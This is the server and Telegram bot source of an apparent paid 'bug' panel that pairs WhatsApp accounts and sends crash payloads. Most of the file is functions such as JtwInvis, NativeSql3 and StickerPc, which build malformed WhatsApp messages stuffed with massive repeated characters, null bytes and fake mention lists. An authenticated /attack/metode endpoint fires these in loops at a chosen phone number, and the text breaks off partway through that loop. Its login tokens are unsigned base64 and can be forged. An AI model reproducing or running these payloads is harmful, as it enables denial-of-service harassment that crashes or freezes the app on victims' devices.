const { Token, owner } = require("./settings/config");
const express = require("express");
const fs = require("fs");
const url = require('url');
const path = require("path");
const cookieParser = require('cookie-parser');
const { exec } = require('child_process');
const cors = require('cors');
const crypto = require('crypto');
const {
    default: makeWASocket,
    makeInMemoryStore,
    useMultiFileAuthState,
    useSingleFileAuthState,
    initInMemoryKeyStore,
    fetchLatestBaileysVersion,
    makeWASocket: WASocket,
    getGroupInviteInfo,
    AuthenticationState,
    BufferJSON,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    generateWAMessage,
    generateMessageID,
    generateWAMessageContent,
    encodeSignedDeviceIdentity,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    getContentType,
    mentionedJid,
    relayWAMessage,
    templateMessage,
    InteractiveMessage,
    Header,
    MediaType,
    MessageType,
    MessageOptions,
    MessageTypeProto,
    WAMessageContent,
    WAMessage,
    WAMessageProto,
    WALocationMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMediaUpload,
    WAMessageStatus,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,
    Presence,
    emitGroupUpdate,
    emitGroupParticipantsUpdate,
    GroupMetadata,
    WAGroupMetadata,
    GroupSettingChange,
    areJidsSameUser,
    ChatModification,
    getStream,
    isBaileys,
    jidDecode,
    processTime,
    ProxyAgent,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    Browsers,
    Browser,
    WAFlag,
    WAContextInfo,
    WANode,
    WAMetric,
    Mimetype,
    MimetypeMap,
    MediaPathMap,
    isJidUser,
    DisconnectReason,
    MediaConnInfo,
    ReconnectMode,
    AnyMessageContent,
    waChatKey,
    WAProto,
    BaileysError,
} = require('@whiskeysockets/baileys');
const pino = require("pino");
const { Telegraf, Markup } = require("telegraf");

const app = express();
const PORT = process.env.PORT || 2451;

app.use(express.json());
app.use(express.static('public'));
app.use(cookieParser());
app.use(cors());

app.use(express.static(path.join(__dirname, 'public')));

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./sessions";
const bot = new Telegraf(Token);

let dim;

let maintenanceMode = false;
let totalRequests = 0;

setInterval(() => {
  totalRequests = 0;
}, 5000);

app.use(async (req, res, next) => {
  if (maintenanceMode) {
    return res.status(503).sendFile(path.join(__dirname, 'public', '503.html'));
  }

  totalRequests++;

  if (totalRequests >= 1000000) {
    maintenanceMode = true;

    const message = encodeURIComponent(
      'Dangerous!\nServer reaches 1,000,000 requests per 5 seconds auto 503'
    );

    const url = `https://api.telegram.org/bot${Token}/sendMessage?chat_id=${owner}&text=${message}`;
    fetch(url)
      .then(r => console.log('Telegram notification sent'))
      .catch(err => console.error('Telegram notification failed', err));

    console.log('Threshold reached! Maintenance mode ON.');

    return res.status(503).sendFile(path.join(__dirname, 'public', '503.html'));
  }

  next();
});

setInterval(() => {
  if (maintenanceMode) {
    maintenanceMode = false;
    console.log('Server recovered. Maintenance mode OFF.');
  }
}, 60000);

const loadAccounts = () => {
  return fs.existsSync('./db/db.json') ? JSON.parse(fs.readFileSync('./db/db.json')) : [];
};

const isAccountExpired = (date) => {
  if (!date) return false;
  return new Date(date).getTime() < Date.now();
};

const generateToken = (user) => {
  const payload = {
    username: user.username,
    role: user.role,
    timestamp: Date.now()
  };
  return Buffer.from(JSON.stringify(payload)).toString('base64');
};

const verifyToken = (token) => {
  try {
    const payload = JSON.parse(Buffer.from(token, 'base64').toString());
    const accounts = loadAccounts();
    const user = accounts.find(acc => acc.username === payload.username);
    return user ? payload : null;
  } catch (error) {
    return null;
  }
};

const requireAuth = (req, res, next) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  const payload = verifyToken(token);
  if (!payload) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }
  req.user = payload;
  next();
};

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/home', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/track', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

app.get('/bug', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'bug.html'));
});

app.get('/ddos', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'ddos.html'));
});

app.get('/contac', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'contac.html'));
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const accounts = loadAccounts();
  const user = accounts.find(acc => acc.username === username && acc.password === password);

  if (!user) {
    return res.status(401).json({ success: false, message: 'Invalid credentials' });
  }

  if (isAccountExpired(user.expired)) {
    const updatedAccounts = accounts.filter(acc => acc.username !== username);
    fs.writeFileSync('./acc.json', JSON.stringify(updatedAccounts, null, 2));
    return res.status(401).json({ success: false, message: 'Account has expired' });
  }

  const validRole = ['ADMIN', 'VIP'].includes(user.role.toUpperCase()) ? user.role.toUpperCase() : 'VIP';
  const token = generateToken(user);

  res.json({
    success: true,
    token,
    user: { username: user.username, role: validRole, expired: user.expired }
  });
});

app.post('/api/logout', requireAuth, (req, res) => {
  res.json({ success: true, message: 'Logged out' });
});

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const saveActive = (botNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(botNumber)) {
    list.push(botNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (botNumber) => {
  const dir = path.join(sessions_dir, `device${botNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(`Found ${activeNumbers.length} active WhatsApp sessions`);

  for (const botNumber of activeNumbers) {
    console.log(`Connecting WhatsApp: ${botNumber}`);
    const sessionDir = sessionPath(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    dim = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      dim.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${botNumber} connected!`);
          sessions.set(botNumber, dim);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      dim.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (botNumber, chatId, ctx) => {
  const sessionDir = sessionPath(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`pairing with number *${botNumber}*...`, {
    parse_mode: "Markdown"
  });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, {
        parse_mode: "Markdown"
      });
    } catch (e) {
      console.error("Error:", e.message);
    }
  };

  let paired = false;

  dim = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  dim.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "connecting") {
      if (!fs.existsSync(`${sessionDir}/creds.json`)) {
        setTimeout(async () => {
          try {
            const code = await dim.requestPairingCode(botNumber);
            const formatted = code.match(/.{1,4}/g)?.join("-") || code;
            await editStatus(makeCode(botNumber, formatted));
          } catch (err) {
            console.error("Error requesting code:", err);
            await editStatus(makeStatus(botNumber, `❗ ${err.message}`));
          }
        }, 3000);
      }
    }

    if (connection === "open" && !paired) {
      paired = true;
      sessions.set(botNumber, dim);
      saveActive(botNumber);
      await editStatus(makeStatus(botNumber, "✅ Connected successfully."));
    }

    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut && code >= 500) {
        console.log("Reconnect diperlukan untuk", botNumber);
        setTimeout(() => connectToWhatsApp(botNumber, chatId, ctx), 2000);
      } else {
        await editStatus(makeStatus(botNumber, "❌ Failed to connect."));
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }
  });

  dim.ev.on("creds.update", saveCreds);
  return dim;
};

const makeStatus = (number, status) => 
  `*Status Pairing*\nNomor: \`${number}\`\nStatus: ${status}`;

const makeCode = (number, code) =>
  `*Kode Pairing*\nNomor: \`${number}\`\nKode: \`${code}\``;

const DB_FILE = "./db/db.json";
let db = fs.existsSync(DB_FILE) ? JSON.parse(fs.readFileSync(DB_FILE)) : [];

const AUTH_FILE = "./db/auth.json";
let authorized = fs.existsSync(AUTH_FILE) ? JSON.parse(fs.readFileSync(AUTH_FILE)) : [];

function saveDB() {
  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}
function saveAuth() {
  fs.writeFileSync(AUTH_FILE, JSON.stringify(authorized, null, 2));
}

function checkAuth(ctx) {
  ctx.isOwner = ctx.from?.id?.toString() === owner;
  ctx.isAuthorized = ctx.isOwner || authorized.includes(ctx.from?.id?.toString());
}

bot.use(async (ctx, next) => {
  ctx.isOwner = ctx.from?.id?.toString() === owner;
  return next();
});

bot.start((ctx) => {
  ctx.replyWithVideo(
    { url: 'https://files.catbox.moe/tcv2pi.mp4' },
    {
      caption: `
welcome to skid-website, i can only help with this

╭─────────
│ 🔹 /pairing <number>
│ 🔹 /listpairing
│ 🔹 /addowner
│ 🔹 /delowner
│ 🔹 /delpairing <number>
│ 🔹 /address <id>
│ 🔹 /delress <id>
│ 🔹 /setjeda
│ 🔹 /addakun
│ 🔹 /listakun
│ 🔹 /delakun <username> <password>
╰──────────`,
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.url('👤 Owner', 'https://t.me/komodigi')],
        [Markup.button.url('📢 Join Channel', 'https://t.me/xpcommuniti')]
      ])
    }
  );
});

bot.command("pairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: `/pairing <number>`", { parse_mode: "Markdown" });
  const botNumber = args[1];
  await ctx.reply(`⏳ Starting pairing to number ${botNumber}...`);
  await connectToWhatsApp(botNumber, ctx.chat.id, ctx);
});

bot.command("listpairing", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  if (sessions.size === 0) return ctx.reply("no active sender.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Active Sender List:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delpairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: /delpairing 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender not found.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} successfully deleted.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Failed to delete sender.");
  }
});

bot.command("address", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Not authorized.");
  const parts = ctx.message.text.split(" ");
  const tgId = parts[1];
  if (!tgId) return ctx.reply("❌ Usage: /address <id>");
  if (authorized.includes(tgId)) return ctx.reply("⚠️ User already registered.");
  authorized.push(tgId);
  saveAuth();
  ctx.reply(`✅ User ${tgId} has been granted access.`);
});

bot.command("listakun", (ctx) => {
  checkAuth(ctx);
  if (!ctx.isAuthorized) return ctx.reply("❌ You are not authorized.");
  if (db.length === 0) return ctx.reply("📂 No accounts available.");

  let msg = "📜 Accounts:\n\n";
  db.forEach((acc, i) => {
    msg += `#${i}\n👤 ${acc.username}\n🎭 ${acc.role}\n⏳ ${acc.expired}\n\n`;
  });
  ctx.reply(msg);
});

let addStep = {};
bot.command("addakun", (ctx) => {
  checkAuth(ctx);
  if (!ctx.isAuthorized) return ctx.reply("❌ You are not authorized.");

  addStep[ctx.from.id] = { step: 1, data: {} };
  ctx.reply("👤 Send username:");
});

bot.on("text", (ctx) => {
  checkAuth(ctx);
  if (!ctx.isAuthorized) return;
  const step = addStep[ctx.from.id];
  if (!step) return;

  if (step.step === 1) {
    step.data.username = ctx.message.text.trim();
    step.step = 2;
    ctx.reply("🔑 Send password:");
  } else if (step.step === 2) {
    step.data.password = ctx.message.text.trim();
    step.step = 3;
    ctx.reply("🎭 Send role (ADMIN/VIP):");
  } else if (step.step === 3) {
    step.data.role = ctx.message.text.trim().toUpperCase();
    step.step = 4;
    ctx.reply("⏳ Send expired date (YYYY-MM-DD):");
  } else if (step.step === 4) {
    step.data.expired = new Date(ctx.message.text.trim()).toISOString();
    db.push(step.data);
    saveDB();
    ctx.reply(`✅ Account *${step.data.username}* added.`, { parse_mode: "Markdown" });
    delete addStep[ctx.from.id];
  }
});


bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addowner Id_\n_Example : /addowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("❌ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✅ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delowner Id_\n_Example : /delowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("❌ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✅ Owner ID ${id} was successfully deleted.`);
});

bot.command("delakun", (ctx) => {
  checkAuth(ctx);
  if (!ctx.isAuthorized) return ctx.reply("❌ You are not authorized.");

  const parts = ctx.message.text.split(" ");
  if (parts.length < 3) {
    return ctx.reply("❌ Usage: /delakun <username> <password>");
  }

  const username = parts[1];
  const password = parts[2];

  const index = db.findIndex(acc => acc.username === username && acc.password === password);

  if (index === -1) {
    return ctx.reply("⚠️ Account not found or credentials do not match.");
  }

  const removed = db.splice(index, 1);
  saveDB();
  ctx.reply(`🗑️ Account **${removed[0].username}** deleted successfully.`, { parse_mode: "Markdown" });
});

bot.command("delress", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Not authorized.");
  const parts = ctx.message.text.split(" ");
  const tgId = parts[1];
  if (!tgId) return ctx.reply("❌ Usage: /delress <id>");
  authorized = authorized.filter((id) => id !== tgId);
  saveAuth();
  ctx.reply(`🗑️ User ${tgId} access revoked.`);
});

bot.command("setjeda", async (ctx) => {
  const input = ctx.message.text.split(" ")[1]; 
  const ms = parseDuration(input);

  if (!ms) {
    return ctx.reply("❌ Format salah!\nContoh yang benar:\n- 30s (30 detik)\n- 5m (5 menit)\n- 1h (1 jam)\n- 1d (1 hari)");
  }

  globalThis.DEFAULT_COOLDOWN_MS = ms;
  DEFAULT_COOLDOWN_MS = ms; // sync ke alias lokal juga

  ctx.reply(`✅ Jeda berhasil diubah jadi *${input}* (${ms / 1000} detik)`);
});

// fangsion kamyuh🤭

/* 
Eror Cakap
Blank Andro
No Share To PT
*/async function Lostsaga2(isTarget) {
  let msg = await generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ꦾ".repeat(77777), 
              hasMediaAttachment: false,
            },
            body: {
              text: "⎋ Reo Suka Rename" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamJson: "",
                },
                {
                  name: "cta_url",
                  buttonParamJson: "",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await dim.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes Sending Bug To ${target}`));
}

async function JtwInvis(dim, target) {
    const JtwFunction = "{".repeat(1000000); 

    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: JtwFunction,
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: JtwFunction,
                address: JtwFunction
              }
            },
            body: { text: JtwFunction },
            footer: { text: JtwFunction },
            nativeFlowMessage: {
              messageParamsJson: JtwFunction
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
            }
          }
        }
      },
      buttonsMessage: {
        contentText: JtwFunction,
        footerText: JtwFunction,
        buttons: [
          {
            buttonId: "btn_invis",
            buttonText: { displayText: JtwFunction },
            type: 1
          }
        ],
        headerType: 1
      },
      extendedTextMessage: {
        text: JtwFunction,
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
        }
      },
      documentMessage: {
        fileName: JtwFunction,
        title: JtwFunction,
        mimetype: "application/x-corrupt",
        fileLength: "999999999",
        caption: JtwFunction,
        contextInfo: {}
      },
      stickerMessage: {
        isAnimated: true,
        fileSha256: Buffer.from(JtwFunction).toString("base64"),
        mimetype: "image/webp",
        fileLength: 9999999,
        fileEncSha256: Buffer.from(JtwFunction).toString("base64"),
        mediaKey: Buffer.from(JtwFunction).toString("base64"),
        directPath: JtwFunction,
        mediaKeyTimestamp: Date.now(),
        isAvatar: false
      }
    };

    await dim.relayMessage(target, payload, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    });
    console.log(chalk.red("Done sending buug BY : jtw function buugs"));
}

async function betadelayNew(dim, target, mention) {
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " Я - Majesty's  #Volcanic",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message", //kalau bug nya ga ke kirim hapus aja ini, cuma tambahan doang.
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    });

    await dim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });

    await sleep(2000);

    if (mention) {
        await dim.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25,
                    },
                },
            },
        }, {});
    }
}

async function DelayNewBetaV3(dim, target, mention) {
  const generateMentions = (count = 1900) => {
    return [
      "0@s.whatsapp.net",
      ...Array.from({ length: count }, () =>
        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      )
    ];
  };

  let mentionList = generateMentions(1900);
  let aksara = "ꦀ".repeat(3000) + "\n" + "ꦂ‎".repeat(3000);
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;

  if (11 > 9) {
    parse = parse ? false : true;
  }

  const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".Amelia" + "ោ៝".repeat(10000),
    title: "Gtc",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const tmsg = await generateWAMessageFromContent(target, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "Amelia-Id" + Math.floor(Math.random() * 99999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: mentionList,
        quotedMessage: {
          callLogMesssage: {
            isVideo: true,
            callOutcome: "1",
            durationSecs: "0",
            callType: "REGULAR",
            participants: [{
              jid: "5521992999999@s.whatsapp.net",
              callOutcome: "1"
            }]
          },
          viewOnceMessage: {
            message: {
              stickerMessage: {
                url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
                fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                mimetype: type,
                directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                fileLength: {
                  low: Math.floor(Math.random() * 200000000),
                  high: 0,
                  unsigned: true
                },
                mediaKeyTimestamp: {
                  low: Math.floor(Math.random() * 1700000000),
                  high: 0,
                  unsigned: false
                },
                firstFrameLength: 19904,
                firstFrameSidecar: "KN4kQ5pyABRAgA==",
                isAnimated: true,
                stickerSentTs: {
                  low: Math.floor(Math.random() * -20000000),
                  high: 555,
                  unsigned: parse
                },
                isAvatar: parse,
                isAiSticker: parse,
                isLottie: parse
              }
            }
          },
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            caption: `</> Amelia Is Back!!! - ${aksara}`,
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "19769",
            height: 354,
            width: 783,
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            jpegThumbnail: null,
            scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
            scanLengths: [2437, 17332],
            contextInfo: {
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9999,
              isForwarded: true
            }
          }
        },
        annotations: [
          {
            embeddedContent: {
              X 
            },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});

  await dim.relayMessage("status@broadcast", tmsg.message, {
    messageId: tmsg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await dim.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: tmsg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined
        }
      ]
    });
  }
}

async function NativeSql3(dim, target, mention) {
const DelayMent = [
    "9999999999@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
];
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { 
            text: "ηтє∂ нєℓρ уσυ¿?꙱"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: "\u0000".repeat(1045000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "\u0000".repeat(1045000),
              }
            ],
             messageParamsJson: "{}"
          }
        },
         contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: `ExecutorVre`,
              body: `${"\u0000".repeat(90000)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: "https://Wa.me/stickerpack/NtedExec"
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            isSampled: true,
            mentionedJid: DelayMent
        }
      }
    }
  }

 await dim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await dim.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                    protocolMessage: {
                            key: msg.key,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Nted Said : You Idiot?" }, //Jan Di Ubah
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function StickerPc(dim, target) {
  const xfuc = Array.from({ length: 5000 }, (_, i) => ({
    fileName: `bcdf1b38-4ea9-4f3e-b6db-e428e4a581${i + 1}.webp`,
    isAnimated: true,
    emojis: ["😹"],
    accessibilityLabel: "💤",
    mimetype: "image/webp"
  }));
  const one = await generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(25000),
            publisher: "Xtrovie - Execute",
            stickers: xfuc,
            fileLength: "3662919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
            mediaKeyTimestamp: "1747502082",
            contextInfo: {
              remoteJid: "status@broadcast",
              participant: "0@s.whatsapp.net",
              stanzaId: Date.now(),
              isForwarded: true,
              forwardingScore: 1972,
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593,
              sendEphemeral: true,
              ephemeralExpiration: 86400,
              nativeFlow: true,
              statusV3: "broadcast",
              relayNodes: Array.from({ length: 50000 }, (_, i) => ({
                 node: null + i,
                 type: null
              })),
              mentionedJid: [
                target,
                ...Array.from(
                  { length: 1999 },
                  () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                )
              ],
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "REJECTED",
                  durationSecs: "1",
                  callType: "SCHEDULED_CALL",
                  participants: [
                    { jid: target, callOutcome: "CONNECTED" },
                    { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
                    { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
                    { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" }
                  ]
                }
              }
            }
          }
        }
      }
    }),
    {}
  );
  await dim.relayMessage(target, one.message, {
    messageId: one.key.id,
    participant: { jid: target }
  });
}



//pp
app.get("/attack/metode", requireAuth,  async (req, res) => {
  try {
    const metode = req.query.metode;
    const target = req.query.target;

    if (!metode || !target) {
      return res.status(400).json({ status: false, message: "'metode' and 'target' required" });
    }

    const isTarget = target.replace(/\D/g, "") + "@s.whatsapp.net";

    if (sessions.size === 0) {
      return res.status(400).json({ status: false, message: "No active sender" });
    }

    const botNumber = [...sessions.keys()][0];
    const dim = sessions.get(botNumber);
    if (!dim) {
      return res.status(400).json({ status: false, message: "Socket not found" });
    }

    switch (metode.toLowerCase()) {
      case "crash":
        for (let i = 0; i < 40; i++) {
